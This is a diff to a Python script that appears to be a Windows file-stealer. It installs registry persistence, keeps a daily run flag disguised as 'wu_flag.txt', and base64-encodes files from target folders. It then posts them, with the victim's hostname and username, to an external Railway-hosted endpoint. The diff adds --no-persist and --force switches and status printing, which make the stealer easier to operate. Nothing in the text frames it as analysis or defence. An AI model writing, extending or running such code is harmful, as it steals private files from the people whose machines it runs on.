@@ -1,4 +1,4 @@
-import pathlib, socket, os, base64, requests, time, winreg, datetime
+import pathlib, socket, os, base64, requests, time, winreg, datetime, sys
 
 def add_persistence():
     try:
@@ -8,13 +8,16 @@ def add_persistence():
         winreg.CloseKey(key)
     except: pass
 
-# step 1 — persist first
-add_persistence()
+# step 1 — persist first (skip with --no-persist)
+if "--no-persist" not in sys.argv:
+    add_persistence()
 
-# step 2 — check if already ran today
+# step 2 — check if already ran today (skip with --force)
 flag = pathlib.Path(os.environ.get("TEMP")) / "wu_flag.txt"
-if flag.exists() and flag.read_text() == str(datetime.date.today()):
-    exit()
+if "--force" not in sys.argv:
+    if flag.exists() and flag.read_text() == str(datetime.date.today()):
+        print("[!] Already ran today. Use --force to run again.")
+        exit()
 flag.write_text(str(datetime.date.today()))
 
 # step 3 — wait
@@ -35,11 +38,14 @@ for target in target_dirs:
         try:
             if f.is_file() and f.suffix in EXTS and f.stat().st_size < 5_000_000:
                 content = base64.b64encode(f.read_bytes()).decode()
-                requests.post("https://cvsstool-production.up.railway.app/send", json={
+                r = requests.post("https://cvsstool-production.up.railway.app/send", json={
                     "hostname": hostname,
                     "username": username,
                     "token": "qutmess",
                     "file": {"name": str(f.relative_to(base_path)), "content": content}
                 }, timeout=10)
-        except (PermissionError, requests.exceptions.RequestException):
-            continue
+                print(f"[+] Sent {f.name} - Status: {r.status_code}")
+        except PermissionError as e:
+            print(f"[-] Permission denied: {f}")
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Request failed: {e}")
